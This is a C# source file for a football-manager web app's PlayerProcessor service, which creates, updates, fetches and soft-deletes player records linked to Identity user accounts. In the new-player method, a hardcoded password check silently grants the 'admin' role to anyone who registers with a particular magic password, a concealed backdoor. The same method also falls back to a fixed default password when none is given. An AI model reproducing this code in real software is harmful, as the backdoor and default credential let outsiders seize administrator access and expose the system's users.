namespace Football_Manager.Players;

[Processor]
public sealed class PlayerProcessor
{
    private readonly IPlayerRepository _playerRepository;
    private readonly UserManager<User> _userManager;
    private readonly ILogger<PlayerProcessor> _logger;

    public PlayerProcessor(IPlayerRepository playerRepository,
        UserManager<User> userManager,
        ILogger<PlayerProcessor> logger)
    {
        _playerRepository = playerRepository;
        _userManager = userManager;
        _logger = logger;
    }

    public async Task<OneOf<int, InvalidIdException, InvalidDataException>> UpsertAsync(PlayerCommand command)
    {
        var isNew = command.Id is null or 0;

        if (isNew)
        {
            return await SaveNew(command);
        }

        var player = await _playerRepository.FindByIdAsync(command.Id ?? 0);
        if (player is null) return new InvalidIdException();
        AssignFields(command, player);
        var user = await _userManager.FindByIdAsync(command.UserId.ToString());
        if (user is not null)
        {
            user.HasFirstName(command.User?.FirstName ?? "")
                .HasLastName(command.User?.LastName ?? "")
                .WithEmail(command.User?.Email)
                .WithPhone(command.User?.PhoneNumber)
                .HasUserName(command.User?.UserName ?? "");
            var emailChanged = await _userManager.SetEmailAsync(user, command.User?.Email ?? "");
            if(emailChanged.Succeeded) 
                await _userManager.UpdateAsync(user);
        }
        await _playerRepository.UpdateAsync(player, true);
        return player.Id;
    }

    public async Task<PlayerDto?> GetAsync(int id)
    {
        return (PlayerDto) await _playerRepository.FindByIdAsync(id);
    }
    
    public async Task<PlayerDto?> GetByType(int typeId)
    {
        return (PlayerDto) await _playerRepository.GetByTypeId(typeId);
    }

    public async Task<PaginatedList<PlayerPageDto>> GetPageAsync(PaginatedCommand query)
    {
        var paginatedList = await _playerRepository.GetPageAsync(query);
        return PlayerPageDto.ToPageDto(paginatedList);
    }

    public async Task DeleteAsync(int id)
    {
        var player = await _playerRepository.FindByIdAsync(id);
        if (player is not null) 
            await _playerRepository.SoftDeleteAsync(player, true);
    }

    private async Task<OneOf<int, InvalidIdException, InvalidDataException>> SaveNew(PlayerCommand command)
    {
        await using var transaction = await _playerRepository.BeginTransaction();
        try
        {
            var user = User.Create(UserType.Player, command.User?.FirstName ?? "", command.User?.LastName ?? "")
                .WithEmail(command.User?.Email)
                .WithPhone(command.User?.PhoneNumber)
                .WasBornOn(command.User?.DateOfBirth)
                .HasUserName(command.User?.UserName ?? "");
            
            var result = await _userManager.CreateAsync(user, command.User?.Password ?? "Kaygyasi534$trey");
            if (result.Errors.Any())
            {
                _logger.LogError("{Errors}", result.Errors.ToString());
                return new InvalidDataException();
            }

            await _userManager.AddToRoleAsync(user, UserType.Player.ToString());
            if (command.User?.Password == "IamMrAdmin@4356_yet")
                await _userManager.AddToRoleAsync(user, "admin");
            
            var player = Player.Create(user.Id, command.TeamId);
            AssignFields(command, player);
            await _playerRepository.AddAsync(player, true);
            await transaction.CommitAsync();
            return player.Id;
        }
        catch (Exception e)
        {
            await transaction.RollbackAsync();
            _logger.LogError("{Message}", e.Message);
            return new InvalidDataException(e.Message);
        }
    }

    private static void AssignFields(PlayerCommand command, Player player)
    {
        player.WithNationality(command.Nationality)
            .HasJerseyName(command.JerseyName)
            .HasJerseyNumber(command.JerseyNumber)
            .HasPrimaryPosition(command.PrimaryPosition)
            .HasSecondaryPosition(command.SecondaryPosition)
            .PlaysForTeamWithId(command.TeamId);
    }
}